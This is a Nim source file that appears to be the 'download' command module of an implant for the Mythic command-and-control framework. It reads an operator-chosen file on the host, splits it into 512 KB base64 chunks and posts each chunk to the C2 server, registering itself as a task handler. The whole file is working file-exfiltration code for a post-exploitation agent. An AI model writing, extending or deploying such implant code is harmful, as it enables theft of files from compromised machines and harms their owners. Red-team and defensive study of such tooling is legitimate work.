import std/[os, json, base64, strutils]
import ../types
import ./registry

const DownloadChunkSize = 512 * 1024  ## 512 KB per chunk

proc downloadExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
  let path = params{"path"}.getStr("").strip()
  if path.len == 0:
    return TaskResult(output: "Error: path required", status: "error", completed: true)

  let fullPath = if isAbsolute(path): path else: state.cwd / path
  if not fileExists(fullPath):
    return TaskResult(output: "File not found: " & fullPath,
                      status: "error", completed: true)
  try:
    let data      = readFile(fullPath)
    let dataLen   = data.len
    let totalChunks = max(1, (dataLen + DownloadChunkSize - 1) div DownloadChunkSize)
    var fileId    = ""

    for i in 0 ..< totalChunks:
      let chunkStart = i * DownloadChunkSize
      let chunkEnd   = min((i + 1) * DownloadChunkSize, dataLen)
      let chunkB64   = encode(data[chunkStart ..< chunkEnd])

      var dlNode = %*{
        "total_chunks": totalChunks,
        "chunk_num":    i + 1,
        "chunk_data":   chunkB64,
        "full_path":    fullPath,
        "is_screenshot": false,
      }
      if fileId.len > 0:
        dlNode["file_id"] = %fileId

      let msg = %*{
        "action": "post_response",
        "responses": [%*{"task_id": taskId, "download": dlNode}],
      }
      let resp = send(msg)
      if resp.kind == JNull:
        return TaskResult(
          output: "Transfer failed at chunk " & $(i + 1),
          status: "error", completed: true)

      ## Capture file_id from Mythic's first response
      if i == 0 and fileId.len == 0:
        let responses = resp{"responses"}
        if not responses.isNil and responses.kind == JArray and responses.len > 0:
          fileId = responses[0]{"file_id"}.getStr("")

    return TaskResult(
      output: "Downloaded: " & fullPath & " (" & $dataLen & " bytes, " &
              $totalChunks & " chunk(s))",
      status: "success",
      completed: true,
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initDownload*() =
  register("download", downloadExecute)
